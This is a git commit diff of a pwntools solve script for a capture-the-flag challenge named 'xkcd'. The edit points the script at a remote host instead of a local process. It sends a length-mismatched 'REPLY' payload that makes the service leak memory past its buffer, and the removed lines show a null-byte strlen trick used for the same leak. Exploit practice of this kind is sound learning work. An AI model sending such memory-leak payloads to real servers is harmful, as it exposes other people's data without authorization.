693ad57710f114e535881c7118d033e309e6f8ed
realbadbytes <badbytes.io@gmail.com>
2018-12-05 21:09:53 -0800

    xkcd solve

--- weekly_pwnable/week1/solve.py
+++ weekly_pwnable/week1/solve.py
@@ -2,15 +2,8 @@
 
 from pwn import *
 
-r = process('/home/user/ctf_dump/weekly_pwnable/week1/xkcd')
+# r = process('/home/user/ctf_dump/weekly_pwnable/week1/xkcd')
+conn = remote('167.99.10.211', 4444)
 
-r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*200, 200))
-print(r.recvline())
-
-# now we can write a null byte to the middle of our first payload, this will affect the strlen call
-r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*100, 100))
-print(r.recvline())
-
-# now leak memory
-r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*10, 1000))
-print(r.recvline())
+conn.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*512, 528))
+print(conn.recvline())
